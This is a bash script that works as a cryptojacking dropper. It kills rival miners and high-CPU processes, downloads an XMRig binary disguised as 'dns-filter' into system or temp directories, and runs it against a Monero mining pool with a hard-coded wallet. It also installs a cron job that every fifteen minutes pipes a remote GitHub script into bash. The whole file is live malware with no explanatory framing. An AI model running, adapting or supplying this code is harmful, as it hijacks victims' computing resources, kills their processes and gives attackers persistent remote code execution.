#!/bin/bash
for f in /tmp/usr/lib/systemdev/dns-filter /usr/lib/systemdev/dns-filter /usr/lib/dev/systemdev/dns-filter; do
    [ -f "$f" ] && rm -f "$f"
done
[[ $(id -u) -eq 0 ]] && systemctl stop systemd_s 2>/dev/null

kill_unwanted() {
    pkill -f "index.js" 2>/dev/null; pkill xmr 2>/dev/null
    pgrep "index.js" 2>/dev/null | grep -v "^$$" | xargs -r kill 2>/dev/null
}
kill_unwanted

kill_high_cpu_processes() {
    local exclude=("reservepattern454545" "oAwgBCFH")
    ps -eo pid,%cpu --sort=-%cpu 2>/dev/null | awk '$2>150 {print $1}' | while read -r p; do
        cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null || echo "")
        for e in "${exclude[@]}"; do [[ "$cmd" == *"$e"* ]] && continue 2; done
        kill -9 "$p" 2>/dev/null
    done
}

[[ $(id -u) -eq 0 ]] && { HOME_1='/usr/lib/dev'; } || { HOME_1='/tmp/usr/lib'; }
mkdir -p "$HOME_1/systemdev" 2>/dev/null
prog="$HOME_1/systemdev/dns-filter"

run_program() {
    launch() { nohup "$@" >/dev/null 2>&1 & sleep 1; }
    fallback() {
        curl -k -fL -o /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static" 2>/dev/null || \
        wget -qO /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static" 2>/dev/null
        chmod +x /tmp/dns 2>/dev/null
    }
    [ -x "$prog" ] && launch "$prog" -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls oAwgBCFH && return 0
    fallback && [ -x /tmp/dns ] && launch /tmp/dns -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls oAwgBCFH
}

if [ -e "$prog" ]; then
    run_program
    pkill -f "systemd-t" 2>/dev/null
else
    curl -k -L -o "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl" 2>/dev/null || \
    wget -qO "$HOME_1/systemdev/yes.tar.xz" "https://gh-proxy.com/https://github.com/el3ctr0wqw1/xmrig-vrl2/releases/download/main/xmrig-vrl" 2>/dev/null
    [ -f "$HOME_1/systemdev/yes.tar.xz" ] && mv "$HOME_1/systemdev/yes.tar.xz" "$prog" && chmod +x "$prog"
    run_program
fi

create_cronjob() {
    local c=""
    command -v curl >/dev/null && c="curl -fsSLk $1 | tr -d '\r' | bash"
    command -v wget >/dev/null && c="wget -qO- $1 | tr -d '\r' | bash"
    [[ -n "$c" ]] && (crontab -l 2>/dev/null | grep -v "$1"; printf "*/15 * * * * %s\n" "$c") | crontab -
}
create_cronjob "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon1.sh"

rm -f /tmp/mon.sh /tmp/run.sh /tmp/run1.sh 2>/dev/null
